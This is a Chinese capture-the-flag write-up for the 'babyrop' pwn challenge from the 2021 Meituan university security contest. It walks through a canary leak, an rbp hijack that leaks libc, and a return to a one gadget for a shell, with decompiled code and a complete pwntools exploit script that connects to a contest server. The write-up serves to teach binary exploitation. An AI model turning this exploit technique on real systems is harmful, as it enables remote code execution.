# 第四届2021美团网络安全高校挑战赛 2021 pwn **babyrop**

> challenge name: `babyrop`
>
> file: `babyrop`, `libc-2.27.so`
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16
>
> thanks liwl yuxc

也许可以归类为ret2text，因为核心操作是覆盖canary后，控制rbp的值和返回地址，使得跳到一个依据rbp值来输出字符串的地方，从而泄露libc。然后会再次执行到vuln时，返回到one gadget.

1. main输入name时溢出1B，泄露canary
2. vuln中控制rbp，返回到main中依据rbp调用`printf("%s", name)`处，泄露libc
3. 再次进入vuln，return to one gadget

题目给了libc，则一开始就可以猜测会用one gadget。

解法很简单，但是发现仅通过rbp就可以泄露libc的汇编位置比较困难，适合作为一道拓宽思考方向的简单ROP题。



# IDA Analysis

函数名保留了，可以直接看到有个vuln函数，这里明显存在一个栈溢出，但是栈溢出只能刚好覆盖完canary, rbp, ReturnAddress

```c
unsigned __int64 vuln()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
  v2 = __readfsqword(0x28u);
  read(0, buf, 0x30uLL);                        // stack overflow
  return __readfsqword(0x28u) ^ v2;
}
```

vuln的栈空间，从高地址往低地址：

```assembly
return address # buf最多可以覆盖到返回地址RA这
rbp
canary     # 如果想要覆盖后面的rbp，RA，需要覆盖正确的canary，否则 call ___stack_chk_fail 
buf[0x18]  # 用户可以输入的地方，低地址
```

main函数中有个24B的buffer用于存储用户输入的name，但是在输入时实际可以输入25B，刚好会把canary最低的1B(`0x00`)给覆盖掉，后续在`printf("... %s, ...", name)`的时候就会把canary输出出来，故可以在此泄露canary。后面输入的整数如果与`"password"`字符串的地址相等则会调用`vuln`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+0h] [rbp-30h]
  char *password_addr; // [rsp+8h] [rbp-28h] BYREF
  char name[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("What your name? ");
  for ( i = 0; i <= 24; ++i )                   // 多输入1B 可以泄露canary
  {
    if ( (unsigned int)read(0, &name[i], 1uLL) != 1 || name[i] == '\n' )
    {
      name[i] = 0;
      break;
    }
  }
  printf("Hello, %s, welcome to this challenge!\n", name); // 利用这一句来泄露libc
  puts("Please input the passwd to unlock this challenge");
  __isoc99_scanf("%lld", &password_addr);
  if ( password_addr == "password" )            // bss addr
  {
    puts("OK!\nNow, you can input your message");
    vuln();
    puts("we will reply soon");
  }
  return 0;
}
```

> 一次程序运行中，所有的canary的值相同。



# How to Exp

栈溢出的空间非常有限，仅仅能控制canary，rbp，return addr。main中输出name的汇编如下，可以看到这里会使用rbp来确定`%s`输出的地址，故几乎可以输出任何地址上的内容（以%s的形式）

```assembly
.text:0000000000400818        lea     rax, [rbp+name] ; name = byte ptr -20h
.text:000000000040081C        mov     rsi, rax
.text:000000000040081F        lea     rdi, format   ; "Hello, %s, welcome to this challenge!\n"
.text:0000000000400826        mov     eax, 0
.text:000000000040082B        call    _printf
```

输出完之后会再次执行`vuln`，覆盖RA为one gadget即可getshell



# Exploit

```python
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
IP = "123.57.131.167"
PORT = 22636
DEBUG = 1
elf = ELF("./babyrop")

if DEBUG:
    p = process("./babyrop")  # , env={"LD_PRELOAD": "./libc-2.27.so"}
    # p = process("./babyrop")
    libc = ELF("./libc-2.27.so")
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[0].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())

else:  # flag{c53a3433-c33d-4577-a6ee-37d0d69fc310}
    p = remote(IP, PORT)
    libc = ELF("./libc-2.27.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        cmd += "b *%d\n" % (0x400744)  # 4007C8
        cmd += "b *%d\n" % (0x40082B)
        cmd += "b *%d\n" % (0x40084F)
        cmd += "set $a=%d\n" % (0x601010)  # arrPtr
        debug(cmd)


# === Step-1: stack overflow 1B, leak canary
name = "myname".ljust(25, "0")
sa("name? \n", name)
data = ru(name)
canary = u64(b"\x00" + ru(",")[:7])
print("==> ", hex(canary))
sla("unlock this challenge\n", "4196782")  # input password addr
# 0x601020 : addr of stdin in bss    # .bss:601020 stdin@@GLIBC_2_2_5

# === Step-2: hijack rbp, return addr
print("stdin:", hex(libc.sym['_IO_2_1_stdin_']))  # end with 0x00
payload = b'a'.ljust(0x18, b'a') + p64(canary) + p64(0x601020 + 0x20 + 1) + p64(0x400818)  #
sa("you can input your message\n", payload)

leak_addr = u64((b"\x00" + p.recvuntil("\x7f")[-5:]).ljust(8, b"\x00"))
libc.address = leak_addr - libc.sym['_IO_2_1_stdin_']
print("==> leak_addr", hex(leak_addr), "stdin:", hex(libc.sym['_IO_2_1_stdin_']))
print("==> libc.address", hex(libc.address))

sla("unlock this challenge\n", "4196782")  # input password addr

# === Step-3: return to one gadget
one_gadget = libc.address + 0x4f3d5
payload = b'a'.ljust(0x18, b'a') + p64(canary) + p64(0xdeadbeef) + p64(one_gadget)
sa("you can input your message\n", payload)
dd()
p.interactive()

```

payload解释：

```python
payload = b'a'.ljust(0x18, b'a') + p64(canary) + p64(0x601020 + 0x20 + 1) + p64(0x400818)
```

- 0x601020: bss上stdin的地址
- 0x20: `.text:0000000000400818` 上是用`rbp-0x20`的方式获得，为了最后得到的是stdin的地址，需要提前+0x20
- 1: 由于这个libc的`_IO_2_1_stdin_`最低1B刚好是0x00，输出时会被截断，所以+1，跳过最低1B的0x00
